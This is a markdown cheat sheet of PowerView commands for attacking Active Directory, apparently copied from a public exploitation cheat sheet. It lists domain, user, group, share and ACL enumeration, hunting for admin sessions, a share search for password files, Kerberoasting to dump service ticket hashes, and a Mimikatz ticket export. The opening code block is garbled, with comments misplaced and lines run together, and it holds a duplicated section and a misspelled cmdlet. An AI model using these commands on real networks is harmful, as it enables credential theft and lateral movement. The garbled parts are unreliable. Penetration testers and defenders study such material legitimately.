# PowerView

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

- Current Domain

```bash
#Get Current Domain: 
Get-Domain

Enumerate Other Domains: 
#Get-Domain -Domain <DomainName>

#Get Domain SID: 
Get-DomainSIDGet Current Domain: Get-Domain

#Enumerate Other Domains: 
Get-Domain -Domain <DomainName>

Get Domain SID: 
#Get-DomainSID
```

- **Get Domain Policy:**

```bash
Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

- **Get Domain Controllers:**

```bash
Get-DomainController
Get-DomainController -Domain <DomainName>
```

- **Enumerate Domain Users:**

```bash
#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

- **Enum Domain Computers:**

```bash
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

- **Enum Groups and Group Members**

```bash
#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

- **Enum Domain Computers:**

```bash
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

- **Enumerate Shares:**

```bash
#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*
```

- **Enum Group Policies:**

```bash
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerate all GPOs to a specific computer
Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

#Get users that are part of a Machine's local Admin group
Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
```

- **Enum ACLs:**

```bash
# Returns the ACLs associated with the specified account
Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
```

- **User Hunting:**

```bash
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain
Find-DomainLocalGroupMember -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirming admin access
Test-AdminAccess
```

Kerberoasting

```bash
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket

#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
